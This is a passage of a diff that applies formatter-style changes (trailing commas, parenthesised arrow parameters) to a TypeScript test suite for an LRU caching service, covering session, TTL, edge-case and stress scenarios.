           const sessions = Array.from({ length: 20 }, (_, i) => ({
             id: `session_${i}`,
             userId: `user_${i % 5}`, // 5 users, multiple sessions
-            lastActivity: Date.now() - Math.random() * 3600000 // Within last hour
+            lastActivity: Date.now() - Math.random() * 3600000, // Within last hour
           }));
 
-          sessions.forEach(session => {
+          sessions.forEach((session) => {
             realWorldCache.set(`session:${session.id}`, session);
 
             // Simulate access based on recency
-            if (Date.now() - session.lastActivity < 300000) { // Active in last 5 minutes
+            if (Date.now() - session.lastActivity < 300000) {
+              // Active in last 5 minutes
               realWorldCache.get(`session:${session.id}`);
             }
           });
@@ -3471,14 +3556,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           const apiEndpoints = [
             { endpoint: '/api/users', ttl: 600000 }, // 10 minutes
             { endpoint: '/api/products', ttl: 1800000 }, // 30 minutes
-            { endpoint: '/api/stats', ttl: 60000 } // 1 minute
+            { endpoint: '/api/stats', ttl: 60000 }, // 1 minute
           ];
 
           apiEndpoints.forEach(({ endpoint, ttl }) => {
             const response = {
               data: `Response data for ${endpoint}`,
               cachedAt: Date.now(),
-              ttl
+              ttl,
             };
 
             realWorldCache.set(`api:${endpoint}`, response, ttl);
@@ -3489,21 +3574,21 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           // Computed results that are expensive to generate
           const computations = ['complex_query_1', 'complex_query_2', 'complex_query_3'];
 
-          computations.forEach(comp => {
+          computations.forEach((comp) => {
             const result = {
               id: comp,
               result: `Computed result for ${comp}`,
               computationTime: Math.random() * 1000 + 500,
-              computedAt: Date.now()
+              computedAt: Date.now(),
             };
 
             realWorldCache.set(`computed:${comp}`, result);
           });
-        }
+        },
       };
 
       // Execute scenarios
-      Object.values(scenarios).forEach(scenario => scenario());
+      Object.values(scenarios).forEach((scenario) => scenario());
 
       // Verify real-world cache behavior
       const stats = realWorldCache.getStats();
@@ -3532,7 +3617,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
     it('should handle edge case data structures', () => {
       const edgeCaseCache = new LRUCache<string, any>({
         maxSize: 50,
-        maxMemoryBytes: 2048
+        maxMemoryBytes: 2048,
       });
 
       const edgeCases = [
@@ -3549,12 +3634,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
               level2: {
                 level3: {
                   level4: {
-                    level5: 'deep value'
-                  }
-                }
-              }
-            }
-          }
+                    level5: 'deep value',
+                  },
+                },
+              },
+            },
+          },
         },
 
         // Special values
@@ -3566,7 +3651,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         // Large structures
         {
           key: 'large-array',
-          value: Array.from({ length: 1000 }, (_, i) => ({ id: i, data: `item-${i}` }))
+          value: Array.from({ length: 1000 }, (_, i) => ({ id: i, data: `item-${i}` })),
         },
 
         // Special characters
@@ -3576,8 +3661,8 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             emoji: '🚀🎉💻',
             chinese: '中文测试',
             arabic: 'اختبار العربي',
-            symbols: '⚡🔥💧'
-          }
+            symbols: '⚡🔥💧',
+          },
         },
 
         // Mixed types
@@ -3591,9 +3676,9 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
             array: [1, 'two', { three: 3 }],
             object: { nested: { value: 'deep' } },
             date: new Date(),
-            regex: /test/g
-          }
-        }
+            regex: /test/g,
+          },
+        },
       ];
 
       // Test each edge case
@@ -3626,7 +3711,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       const extremeCache = new LRUCache<string, any>({
         maxSize: 1000,
         maxMemoryBytes: 50 * 1024 * 1024, // 50MB
-        ttlMs: 60000 // 1 minute
+        ttlMs: 60000, // 1 minute
       });
 
       const extremeConditions = {
@@ -3637,7 +3722,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           for (let i = 0; i < 10000; i++) {
             promises.push(
               Promise.resolve().then(() => {
-                extremeCache.set(`rapid-${i}`, { data: `x`.repeat(i % 100 + 1) });
+                extremeCache.set(`rapid-${i}`, { data: `x`.repeat((i % 100) + 1) });
                 return extremeCache.get(`rapid-${Math.floor(Math.random() * 1000)}`);
               })
             );
@@ -3657,12 +3742,12 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           for (let i = 0; i < 2000; i++) {
             const item = {
               key: `pressure-${i}`,
-              value: 'x'.repeat(1024 * (i % 10 + 1)) // 1KB to 10KB items
+              value: 'x'.repeat(1024 * ((i % 10) + 1)), // 1KB to 10KB items
             };
             largeItems.push(item);
           }
 
-          largeItems.forEach(item => {
+          largeItems.forEach((item) => {
             extremeCache.set(item.key, item.value);
           });
 
@@ -3693,14 +3778,14 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           const workerResults = await Promise.all(workers);
 
           workerResults.forEach((results, workerId) => {
-            expect(results.every(r => r === true)).toBe(true);
+            expect(results.every((r) => r === true)).toBe(true);
             expect(results).toHaveLength(100);
           });
-        }
+        },
       };
 
       // Execute extreme conditions tests
-      const promises = Object.values(extremeConditions).map(condition => condition());
+      const promises = Object.values(extremeConditions).map((condition) => condition());
 
       expect(Promise.all(promises)).resolves.not.toThrow();
 
@@ -3721,7 +3806,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
         maxSize: 100,
         maxMemoryBytes: 1024,
         ttlMs: 1000,
-        cleanupIntervalMs: 500
+        cleanupIntervalMs: 500,
       });
 
       // Phase 1: Population
@@ -3730,7 +3815,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           lifecycleCache.set(`lifecycle-${i}`, {
             phase: 'population',
             data: `item-${i}`,
-            createdAt: Date.now()
+            createdAt: Date.now(),
           });
         }
 
@@ -3754,7 +3839,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
       // Phase 3: TTL expiration
       const expirationPhase = async () => {
         // Wait for some items to expire
-        await new Promise(resolve => setTimeout(resolve, 1200));
+        await new Promise((resolve) => setTimeout(resolve, 1200));
 
         // Access items to trigger expiration detection
         for (let i = 0; i < 50; i++) {
@@ -3772,7 +3857,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           lifecycleCache.set(`renewed-${i}`, {
             phase: 'renewal',
             data: `renewed-item-${i}`,
-            renewedAt: Date.now()
+            renewedAt: Date.now(),
           });
         }
 
@@ -3790,7 +3875,7 @@ describe('Caching Service - Comprehensive Cache Functionality', () => {
           totalHits: finalStats.totalHits,
           totalMisses: finalStats.totalMisses,
           hitRate: finalStats.hitRate,
-          memoryUsage: finalStats.memoryUsageBytes
+          memoryUsage: finalStats.memoryUsageBytes,
         };
 
         // Destroy cache
